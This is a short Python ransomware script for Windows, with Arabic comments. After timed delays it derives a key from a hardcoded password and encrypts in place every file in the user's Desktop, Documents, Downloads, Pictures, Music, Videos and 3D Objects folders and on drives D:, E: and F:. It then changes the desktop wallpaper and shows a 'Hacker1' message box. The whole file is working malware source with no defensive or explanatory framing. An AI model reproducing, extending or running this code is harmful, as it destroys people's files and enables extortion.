import ctypes
import os
import base64
from tkinter import messagebox
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import time

time.sleep(10)

def generate_key(password, salt=b"salt_12345", iterations=100_000):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=iterations
    )
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))

def encrypt_file(file_path, password):
    key = generate_key(password)
    cipher_suite = Fernet(key)

    ignored_extensions = (".ini", ".inf")

    if file_path.lower().endswith(ignored_extensions):
        return

    try:
        with open(file_path, 'rb') as file:
            original_data = file.read()

        encrypted_data = cipher_suite.encrypt(original_data)

        with open(file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)

    except PermissionError:
        print(f"تم تجاوز الملف: {file_path} - حدوث خطأ في الوصول.")

def encrypt_folder_recursively(folder_path, password):
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path, password)

time.sleep(10)

if __name__ == "__main__":
    videos_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Videos')
    download = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Downloads')
    pic = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Pictures')
    ob = os.path.join(os.path.join(os.environ['USERPROFILE']), '3D Objects')
    Music = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Music')
    Desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
    paths_to_encrypt = [videos_path, download, pic, ob, Music, documents, Desktop]
    additional_drives = ["D:", "E:", "F:"]

    password = 'hgsjgdjdg'
    time.sleep(10)
    
    # تشفير المجلدات المحددة
    for path in paths_to_encrypt:
        encrypt_folder_recursively(path, password)

    # بحث عن المجلدات في الأقراص الإضافية وتشفيرها أيضاً
    for drive in additional_drives:
        for root, _, _ in os.walk(drive):
            encrypt_folder_recursively(root, password)

    # تحديد مسار الصورة دون تشفيرها
    WALLPAPER_PATH = "file\\file\\file\\wall.jpg"
    ctypes.windll.user32.SystemParametersInfoW(20, 0, WALLPAPER_PATH, 3)

    messagebox.showinfo("hhhhhhhhhh", "Hacker1")
